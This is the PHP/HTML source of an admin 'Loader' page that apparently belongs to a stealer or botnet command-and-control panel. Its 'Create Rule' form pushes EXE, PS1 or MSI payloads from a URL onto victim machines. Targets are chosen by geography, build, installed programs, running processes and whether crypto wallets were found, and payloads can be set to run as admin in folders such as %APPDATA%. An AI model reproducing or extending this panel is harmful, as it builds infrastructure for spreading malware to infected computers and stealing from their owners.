<?php

include "../config.php";
include_once "app/functions.php";
include_once "app/managers/AccountManager.php";

session_start();

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$page_name = "Loader";

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    header("Location: dashboard");
    exit();
}

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

include_once 'app/pages/header.php';

?>
<style>
#loader_table td {
  white-space: normal;
  word-wrap: break-word;
  overflow-wrap: break-word;
}
#loader_table table {
  table-layout: fixed;
  width: 1170px;
}
.cell-content {
  max-width: 100%;
  white-space: normal !important;
  overflow-wrap: break-word !important;
  word-break: break-all !important;
}
.triggers-content {
  max-width: 160px;
  white-space: normal !important;
  overflow-wrap: break-word !important;
  word-break: break-all !important;
}
</style>
<div class="body-wrapper">
    <div class="container-fluid">
        
        <div class="card card-body py-3">
            <div class="row align-items-center">
                <div class="col-12">
                    <div class="d-sm-flex align-items-center justify-space-between">
                        <h4 class="mb-4 mb-sm-0 card-title">Loader</h4>
                        <nav aria-label="breadcrumb" class="ms-auto">
                            <a href="javascript:void(0)" id="btn-add-contact" class="btn btn-xs btn-primary align-items-center" onclick="createRuleModal();">Create Rule</a>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
        
        <style>
        #loader_table td {white-space: normal;word-wrap: break-word;}
        </style>

        <table id="loader_table" class="table text-nowrap customize-table mb-0 align-middle" >
            <thead class="text-dark fs-4">
                <tr>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">ID</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Name</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Type</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">URL</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Limit</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Folder</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Triggers</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Status</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Actions</h6>
                    </th>
                </tr>
            </thead>
            <tbody>

            </tbody>
        </table>
    </div>
</div>
</div>

<!-- Modal Create Rule -->
<div class="modal fade" id="create_rule_modal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-2">
    <div class="modal-dialog modal-dialog-scrollable modal-lg">
        <div class="modal-content">
            <div class="modal-header d-flex align-items-center">
                <h4 class="modal-title" id="modal_create_rule_header">Create File Grabber Rule</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            
            <div class="modal-body">
                <div class="card">
                    <div>
                    
                        <div class="form-body">
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <input type="text" class="form-control" placeholder="Rule Name" id="create_rule_name">
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <input type="text" class="form-control" placeholder="URL" id="create_rule_url">
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <select multiple="multiple" class="form-control" id="create_rule_geo"></select>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <select id="create_rule_builds" multiple="multiple" class="form-control" ></select>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <select id="create_rule_markers" multiple="multiple" class="form-control" ></select>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <select id="create_rule_programs" multiple="multiple" class="form-control" ></select>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <select id="create_rule_process" multiple="multiple" class="form-control" ></select>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-12">
                                    <div class="form-check py-2">
                                        <input class="form-check-input" type="checkbox" value="" id="create_rule_crypto">
                                        <label class="form-check-label" for="create_rule_crypto">Activate if found crypto wallets</label>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-3">
                                    <div class="mb-3">
                                        <div class="form-group mb-4">
                                            <select class="form-select" id="create_rule_csidl" >
                                                <option value="0" selected>%LOCALAPPDATA%\</option>
                                                <option value="1">%APPDATA%\</option>
                                                <option value="2">%DESKTOP%\</option>
                                                <option value="3">%USERPROFILE%\</option>
                                                <option value="4">%DOCUMENTS%\</option>
                                                <option value="5">%PROGRAMFILES%\</option>
                                                <option value="6">%PROGRAMFILES_86%\</option>
                                            </select>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                    <div class="mb-3">
                                        <div class="form-check py-2">
                                            <input class="form-check-input" type="checkbox" value="" id="create_rule_admin">
                                            <label class="form-check-label" for="create_rule_admin">Run as Admin</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                    <div class="form-group mb-4">
                                        <select class="form-select" id="create_rule_type" >
                                            <option value="0" selected>EXE</option>
                                            <option value="1">PS1</option>
                                            <option value="2">MSI</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                    <div class="mb-3">
                                        <input type="number" class="form-control" placeholder="Limit" id="create_rule_limit">
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <a id="modal_create_button" href="#" class="btn btn-primary" >Create</a>
                    <button type="button" class="btn bg-danger-subtle text-danger  waves-effect text-start" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>        
</div>

<div class="dark-transparent sidebartoggler"></div>

<?php include_once 'app/pages/footer.php'; ?>

<!-- blocklist worker -->
<script src="assets/js/loader.js"></script>
</body>
</html>